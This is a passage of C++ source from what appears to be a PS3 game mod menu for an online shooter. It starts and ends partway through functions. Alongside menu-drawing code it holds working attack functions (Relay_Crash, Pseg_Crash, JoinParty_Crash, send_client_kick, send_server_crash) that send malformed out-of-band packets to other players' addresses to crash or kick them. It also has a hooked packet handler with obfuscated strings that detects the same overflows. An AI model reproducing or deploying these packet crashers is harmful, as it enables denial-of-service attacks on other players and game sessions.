		Mshit.menu_offsets[sub_id] = Mshit.scroll[sub_id] >= Mshit.max_options ? Mshit.scroll[sub_id] + 1 - Mshit.max_options : 0;
		SND_Play(hash("cac_screen_fade"), 1, 1),
			Mshit.id = sub_id, Wait(200);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 0, col, white, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

static color interp, maincolor, col2;
float colorstep, _1f = 1.0000f; bool usin = false;
void addColormenu(String title, color col) {
	if (!menu->fade) {
		if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
			col2 = col;
			maincolor = menu->skin;
			SND_Play(hash("cac_screen_fade"), 1, 1);
			usin = true;
			colorstep = 0;
		}
		if (colorstep <= _1f && usin) {
			interp.LerpTo(maincolor, col2, colorstep);
			colorstep += 0.008f;
			menu->skin = interp;
			menu->skin2 = interp;
			menu->skin3 = interp;
			menu->skin4 = interp;
			menu->skin5 = interp;
			menu->skin6 = interp;
		} else {
			usin = false;
		}
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 0, col, white, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

static color interpE, maincolorE, col2E;
float colorstepE, _1fE = 1.0000f; bool usinE = false;
void addColormenuE(String title, color col, color& colf) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		col2E = col;
		maincolorE = colf;
		SND_Play(hash("cac_screen_fade"), 1, 1);
		usinE = true;
		colorstepE = 0;
	}
	if (colorstepE <= _1fE && usinE) {
		interpE.LerpTo(maincolorE, col2E, colorstepE);
		colorstepE += 0.008f;
		colf = interpE;
	} else {
		usinE = false;
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 0, col, white, align_right);

		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

std::vector<std::string> Sky;
void ProcessSky() {
	Sky.clear();
	int fd;
	const char* dirName = hash("/dev_hdd0/tmp/Genisys/Skyboxes/");
	size_t dirLength = strlen(dirName) + 1;
	uint32_t data_count = 0;
	CellFsDirectoryEntry entry;
	memset(&entry, 0, sizeof(CellFsDirectoryEntry));
	cellFsOpendir(dirName, &fd);
	cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
	do {
		for (int i = 0; i < data_count; i++) {
			cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
			if (strstr(entry.entry_name.d_name, hash(".dds")) != NULL) {
				size_t len = strlen(entry.entry_name.d_name) + dirLength;
				char* fname = new char[len + 1];
				sprintf(fname, hash("%s/%s"), dirName, entry.entry_name.d_name);
				Sky.push_back(entry.entry_name.d_name);
			}
		}
	} while (data_count);
}

void ProcessConfig() {
	Ini.Inis.clear();
	int fd;
	const char* dirName = hash("/dev_hdd0/tmp/Genisys/");
	size_t dirLength = strlen(dirName) + 1;
	uint32_t data_count = 0;
	CellFsDirectoryEntry entry;
	memset(&entry, 0, sizeof(CellFsDirectoryEntry));
	cellFsOpendir(dirName, &fd);
	cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
	do {
		for (int i = 0; i < data_count; i++) {
			cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
			if (strstr(entry.entry_name.d_name, hash(".ini")) != NULL) {
				size_t len = strlen(entry.entry_name.d_name) + dirLength;
				char* fname = new char[len + 1];
				sprintf(fname, hash("%s/%s"), dirName, entry.entry_name.d_name);
				if (strlen(entry.entry_name.d_name) <= 30)
					Ini.Inis.push_back(entry.entry_name.d_name);
			}
		}
	} while (data_count);
}

PartyData_s* get_current_party() {
	if (*reinterpret_cast<int32_t*>(0xFA7A00) == 1)
		return (PartyData_s*)0xF9E450;

	return (PartyData_s*)0xFA9758;
}

int Party_GetPartyData_t[2] = { 0x00141C84, TOC };
int(*Party_GetPartyData)() = (int(*)())Party_GetPartyData_t;

netadr_t GetClientAdr(int i) {
	printf(hash("0x%X\n"), Party_GetPartyData());
	int ret = (Party_GetPartyData() + 0x2D6) + (i * 0x148);
	PartyMember pM = *(PartyMember*)(Party_GetPartyData() + 0x208);
	return pM.platformAddr.netAddr;
}

int Live_GetXuid_t[2] = { 0x00532AE4, TOC };
unsigned __int64(*Live_GetXuid)(int index) = (unsigned __int64(*)(int index))Live_GetXuid_t;

int Live_GetCurrentSession_t[2] = { 0x0052F38C, TOC };
SessionData* (*Live_GetCurrentSession)() = (SessionData * (*)())Live_GetCurrentSession_t;

int Com_ControllerIndex_GetNetworkID_t[2] = { 0x00317560, TOC };
netsrc_t(*Com_ControllerIndex_GetNetworkID)(int index) = (netsrc_t(*)(int index))Com_ControllerIndex_GetNetworkID_t;

int CL_SendPeerData_t[2] = { 0x00131130, TOC };
bool(*CL_SendPeerData)(int session, int localClientNum, netsrc_t sock, int clientNum, msg_t* msg, int dataType) = (bool(*)(int session, int localClientNum, netsrc_t sock, int clientNum, msg_t * msg, int dataType))CL_SendPeerData_t;

int CL_CanWeConnectToClient_t[2] = { 0x00130760, TOC };
int(*CL_CanWeConnectToClient)(int session, int ourClientNum, int theirClientNum) = (int(*)(int session, int ourClientNum, int theirClientNum))CL_CanWeConnectToClient_t;

int NET_OutOfBandData_t[2] = { 0x00333968, TOC };
bool(*NET_OutOfBandData)(netsrc_t sock, netadr_t adr, const char* format, int len) = (bool(*)(netsrc_t sock, netadr_t adr, const char* format, int len))NET_OutOfBandData_t;

PartyMember GetPartyMemeber(int i) {
	PartyMember pM;
	if (*(bool*)0x0FA7A03)
		pM = *(PartyMember*)(0x00F9E658 + i * 0x148);//Lobby
	else
		pM = *(PartyMember*)(0x00FA9960 + i * 0x148);//Party
	return pM;
}

void Relay_Crash(int client_num, int overflow) {
	PartyMember pM = GetPartyMemeber(client_num);
	auto session = Live_GetCurrentSession();
	char buf[1260];
	msg_t msg;

	MSG_Init(&msg, buf, sizeof(buf));

	char relayText[30];
	Com_Sprintf(relayText, 30, hash("relay %i"), overflow);
	MSG_WriteString(&msg, relayText);

	NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, msg.data, msg.cursize);
}

void Pseg_Crash(int client_num, int overflow) {
	PartyMember pM = GetPartyMemeber(client_num);

	char buf[1260];
	msg_t msg;

	char relayText[30];
	MSG_Init(&msg, buf, sizeof(buf));
	Com_Sprintf(relayText, 30, hash("%ipseg"), client_num);
	MSG_WriteString(&msg, relayText);
	MSG_WriteByte(&msg, overflow);
	MSG_WriteLong(&msg, 0xFFFFFFFF);
	MSG_WriteLong(&msg, 0xFFFFFFFF);
	MSG_WriteShort(&msg, 0xFFFF);
	MSG_WriteShort(&msg, 0xFFFF);

	NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, msg.data, msg.cursize);
}

void JoinParty_Crash(int client_num, int overflow) {
	char buf[1024];
	msg_t msg;
	PartyMember pM = GetPartyMemeber(client_num);

	MSG_Init(&msg, buf, sizeof(buf));

	char relayText[30];
	Com_Sprintf(relayText, 30, hash("%ijoinParty"), client_num);
	MSG_WriteString(&msg, relayText);

	MSG_WriteLong(&msg, 0);
	MSG_WriteLong(&msg, 0);
	MSG_WriteLong(&msg, 0);
	MSG_WriteInt64(&msg, 0);
	MSG_WriteByte(&msg, 0);
	MSG_WriteShort(&msg, 0);
	MSG_WriteLong(&msg, 0);
	MSG_WriteByte(&msg, overflow);
	NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, msg.data, msg.cursize);
}

int NET_SendPacket_s[2] = { 0x00463318, TOC };
int(*NET_SendPacket)(int, int, const char*, netadr_t, unsigned long long, unsigned long long) = (decltype(NET_SendPacket))NET_SendPacket_s;

int NET_OutOfBandPrint_s[2] = { 0x033379C, TOC };
int(*NET_OutOfBandPrint)(netsrc_t sock, netadr_t adr, const char* data) = (decltype(NET_OutOfBandPrint))NET_OutOfBandPrint_s;

void send_client_kick(int clientnum) {
	PartyMember pM = GetPartyMemeber(clientnum);
	__builtin_snpause();
	NET_OutOfBandPrint(NS_SERVER, pM.platformAddr.netAddr, hash("connectResponseMigration"));
}

void send_server_crash() {
	char buf[1264];
	msg_t msg;

	MSG_Init(&msg, buf, sizeof(buf));

	if (clientConnection->netchan.reliable_fragments)
		MSG_WriteLong(&msg, clientConnection->netchan.outgoingSequence | 0xC0000000);
	else
		MSG_WriteLong(&msg, clientConnection->netchan.outgoingSequence | 0x80000000);
	if (clientConnection->netchan.sock < 0x4)
		MSG_WriteShort(&msg, clientConnection->netchan.qport);

	MSG_WriteByte(&msg, 0xFF);
	MSG_WriteByte(&msg, 0xFF);
	MSG_WriteShort(&msg, 0xFFFF);
	MSG_WriteShort(&msg, 0xFFFF);

	NET_SendPacket(clientConnection->netchan.sock, msg.cursize, msg.data, clientConnection->netchan.remoteAddress, clientConnection->netchan.remoteAddress.type, clientConnection->netchan.remoteAddress.serverID);
}

bool gaybab_Users[18];
bool V3_Users[18];

void V3User_Pinger() {

	char buf[1024];
	msg_t msg;

	for (int i = 0; i < 18; i++) {
		V3_Users[i] = false;
		PartyMember pM = GetPartyMemeber(i);
		MSG_Init(&msg, buf, sizeof(buf));
		MSG_WriteString(&msg, hash("GenisysV3"));
		NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, msg.data, msg.cursize);
	}
}

int Party_NetAdrToPlatformNetAdr_t[2] = { 0x0139DC4, TOC };
int(*Party_NetAdrToPlatformNetAdr)(netadr_t from, platformNetAdr* addr) = (decltype(Party_NetAdrToPlatformNetAdr))Party_NetAdrToPlatformNetAdr_t;

int Party_FindMember_t[2] = { 0x013A110, TOC };
signed int(*Party_FindMember)(PartyData_s* party, netadr_t playerAddr) = (decltype(Party_FindMember))Party_FindMember_t;

int NET_CompareAdr_t[2] = { 0x333350, TOC };
signed int(*NET_CompareAdr)(netadr_t a, netadr_t b) = (decltype(NET_CompareAdr))NET_CompareAdr_t;

bool is_relay_overflow_attempt(string argv) {
	auto is_crash_attempt = false;

	uint32_t client_num = _atoi(argv.c_str());

	if (client_num > 17) {
		is_crash_attempt = true;
	}

	return is_crash_attempt;
}

bool is_pseg_overflow_attempt(msg_t* msg) {
	auto is_crash_attempt = false;

	std::uint32_t segment, sequence_number, total_size, offset, size;

	msg_begin_read(msg);

	segment = MSG_ReadByte(msg);
	sequence_number = MSG_ReadLong(msg);
	total_size = MSG_ReadLong(msg);
	offset = MSG_ReadShort(msg);
	size = MSG_ReadShort(msg);

	msg_end_read(msg);

	if (segment >= 6) {
		is_crash_attempt = true;
	}

	if (size > 1200) {
		is_crash_attempt = true;
	}

	if (offset + size > total_size) {
		is_crash_attempt = true;
	}

	if (offset + size > 0x1C20) {
		is_crash_attempt = true;
	}

	if (total_size > 0x1C20u) {
		is_crash_attempt = true;
	}

	return is_crash_attempt;
}

bool is_joinparty_overflow_attempt(msg_t* msg) {
	auto is_crash_attempt = false;

	std::uint32_t net_version, msg_check_sum, lan_chal_resp_key_4, xuid, play_list_id, lan_chal_resp_key, ping, party_count;

	msg_begin_read(msg);

	net_version = MSG_ReadLong(msg);
	msg_check_sum = MSG_ReadLong(msg);
	lan_chal_resp_key_4 = MSG_ReadLong(msg);
	xuid = MSG_ReadInt64(msg);
	play_list_id = MSG_ReadByte(msg);
	lan_chal_resp_key = MSG_ReadShort(msg);
	ping = MSG_ReadLong(msg);
	party_count = MSG_ReadByte(msg);

	msg_end_read(msg);

	if (party_count > 17) {
		is_crash_attempt = true;
	}

	return is_crash_attempt;
}

static int Stricmp(const char* s1, const char* s2) { int d; while ((d = toupper(*s2) - toupper(*s1)) == 0 && *s1) { s1++; s2++; } return d; }
int Party_ConnectingToDedicated_t[2] = { 0x13A79C, TOC };
bool(*Party_ConnectingToDedicated)() = (decltype(Party_ConnectingToDedicated))Party_ConnectingToDedicated_t;
Detour CL_DispatchConnectionlessPacket_d;
char CL_DispatchConnectionlessPacket(int localClientNum, netadr_t from, msg_t* msg, int time) {

	const char* Rep = (const char*)Cmd_Argv(0);
	if (!Stricmp(Rep, encryptDecrypt(hash("bnoodbuSdrqnordLhfs`uhno")).c_str()) && *(int*)0x0F0F88C == 0) {//hostmigration
		char buffer[200];
		auto client_num = Party_FindMember(get_current_party(), from);
		auto name = cl_ingame_() ? cg->clients[client_num].PlayerName : get_current_party()->get_party_member(client_num)->gamertag;
		Com_Sprintf(buffer, sizeof(buffer), encryptDecrypt(hash("Jhbj!@uudlqu!Gsnl!$r!Cmnbjde")).c_str(), name);
		UI_OpenToastPopup(0, encryptDecrypt(hash("ite^nchu^ed`ui^rthbhed")).c_str(), VirtualXOR(hash("V8IYM^F/TTFVWASS"), 8).c_str(), buffer, 5000);
		return 0;
	}

	if (!Stricmp(Cmd_Argv(0), VirtualXOR(hash("tbdhs"), 6).c_str())) {//relay
		if (is_relay_overflow_attempt(Cmd_Argv(1))) {

			std::strcpy((char*)Cmd_Argv(0), "");

			char buffer[200];
			auto client_num = Party_FindMember(get_current_party(), from);
			auto name = cl_ingame_() ? cg->clients[client_num].PlayerName : get_current_party()->get_party_member(client_num)->gamertag;
			Com_Sprintf(buffer, sizeof(buffer), encryptDecrypt(hash("Sdm`x!Bs`ri!@uudlqu!Gsnl!$r!Cmnbjde")).c_str(), name);
			UI_OpenToastPopup(0, encryptDecrypt(hash("ite^nchu^ed`ui^rthbhed")).c_str(), VirtualXOR(hash("V8IYM^F/TTFVWASS"), 8).c_str(), buffer, 5000);
		}
	}

	else if (!Stricmp(Cmd_Argv(0) + 1, VirtualXOR(hash("lhagZj~yw"), 6).c_str())) {//joinParty
		if (is_joinparty_overflow_attempt(msg)) {

			std::strcpy((char*)Cmd_Argv(0), "");

			char buffer[200];
			auto client_num = Party_FindMember(get_current_party(), from);
			auto name = cl_ingame_() ? cg->clients[client_num].PlayerName : get_current_party()->get_party_member(client_num)->gamertag;
			Com_Sprintf(buffer, sizeof(buffer), encryptDecrypt(hash("Knho!Q`sux!Bs`ri!@uudlqu!Gsnl!$r!Cmnbjde")).c_str(), name);
			UI_OpenToastPopup(0, encryptDecrypt(hash("ite^nchu^ed`ui^rthbhed")).c_str(), VirtualXOR(hash("V8IYM^F/TTFVWASS"), 8).c_str(), buffer, 5000);
		}
	}

	else if (!Stricmp(Cmd_Argv(0) + 1, VirtualXOR(hash("vtmn"), 6).c_str())) {//pseg
		if (is_pseg_overflow_attempt(msg)) {

			std::strcpy((char*)Cmd_Argv(0), "");

			char buffer[200];
			auto client_num = Party_FindMember(get_current_party(), from);
			auto name = cl_ingame_() ? cg->clients[client_num].PlayerName : get_current_party()->get_party_member(client_num)->gamertag;
			Com_Sprintf(buffer, sizeof(buffer), VirtualXOR(hash("Rpab&Dzhyc,Lz{u|bg4Sdxu9?h<_rpCJGG"), 2).c_str(), name);
			UI_OpenToastPopup(0, encryptDecrypt(hash("ite^nchu^ed`ui^rthbhed")).c_str(), VirtualXOR(hash("V8IYM^F/TTFVWASS"), 8).c_str(), buffer, 5000);
		}
	}

	if (!Party_ConnectingToDedicated()) {

		if (!strcmp(Cmd_Argv(0), VirtualXOR(hash("icmabj~vw"), 10).c_str())) {//challenge

			std::strcpy((char*)Cmd_Argv(0), "");

			auto client_num = Party_FindMember(get_current_party(), from);

			PartyMember pM = GetPartyMemeber(client_num);
			NET_OutOfBandData(Com_ControllerIndex_GetNetworkID(0), pM.platformAddr.netAddr, VirtualXOR(hash("btac{{er"), 16).c_str(), VirtualXOR(hash("btac{{er"), 16).size());//response
		}

		else if (!strcmp(Cmd_Argv(0), VirtualXOR(hash("btac{{er"), 16).c_str())) {//response

			std::strcpy((char*)Cmd_Argv(0), "");

			auto client_num = Party_FindMember(get_current_party(), from);

			V3_Users[client_num] = true;
		}

		else if (!strcmp(Cmd_Argv(0), encryptDecrypt(hash("HI`wdJdc`c")).c_str())) {//IHaveKebab

			std::strcpy((char*)Cmd_Argv(0), "");

			auto client_num = Party_FindMember(get_current_party(), from);

			gaybab_Users[client_num] = true;
		}
	}

	return CL_DispatchConnectionlessPacket_d.Stub(localClientNum, from, msg, time);
}

void AddConfigMenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		ProcessConfig();
		SND_Play(hash("cac_screen_fade"), 1, 1);
		Mshit.id = sub_id;
		Wait(280);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddSkyboxMenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		ProcessSky();
		SND_Play(hash("cac_screen_fade"), 1, 1);
		Mshit.id = sub_id;
		Wait(280);
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddConfigSubmenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready)
		SND_Play(hash("cac_screen_fade"), 1, 1),
		Mshit.scroll[ID_HVH] = 0,
		Mshit.id = sub_id, Wait(200),
		Ini.Name = title;

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void AddCamoMenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		ProcessCamo();
		SND_Play(hash("cac_screen_fade"), 1, 1);
		Mshit.id = sub_id;
		iRecent = title;
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 15) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

std::string Title;
void addCamoOption(std::string title) {
	if (active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				SND_Play(hash("cac_grid_equip_item"), 1, 1);
				Title = "/dev_hdd0/tmp/Genisys/Custom_Camos/" + title;
				loadcamo(Title.c_str());
				Wait(150);
			}
		}
	} else {
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title.c_str(), Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addSkyOption(std::string title) {
	if (active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				SND_Play(hash("cac_grid_equip_item"), 1, 1);
				Title = "/dev_hdd0/tmp/Genisys/Skyboxes/" + title;
				DrawSkybox(Title.c_str());
				Wait(150);
			}
		}
	} else {
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title.c_str(), Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addColormenu1(String title, color col) {
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 0, col, white, align_right);

		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}
	Mshit.maxscroll[Mshit.id]++;
}

void addColorSubmenu1(String title, int sub_id, int i) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready)
		SND_Play(hash("cac_screen_fade"), 1, 1),
		Mshit.id = sub_id, Wait(200);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 10, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 0, menu->skin2, white, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin2 : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addOption(String title) {
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addKOption(const char* title, void(*func)() = nullptr, const char* des = "") {
	if (active) {
		if (ready) {
			if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
				if (Mshit.Mopened) {
					func();
					memset(&_pdPad, 0, sizeof(CellPadData));
				}
				Mshit.maxscroll[Mshit.id]++;
				Mshit.Mopened = false;
			}
		}
	}
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		char MenuBuff[100];
		snprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), des);
		if (active)DrawText(MenuBuff, Vector2((menu->x + 5) - (menu->msize / 2), 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_left, 1);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addOption(const char* title, void(*func)()) {
	if (active && ready && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2))
		func(), Wait(150);
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

float Speed;
void addMOption(const char* title, void(*func)(), const char(*menudescription)) {
	char MenuBuff[12];
	if (active) {
		if (PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2)) {
			if (PadDown(PAD_L1)) {
				Speed = 0;
			} else {
				Speed = 25.0f;
			}

			if (ready) {
				Wait(Speed);
				func();
			}
		}
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
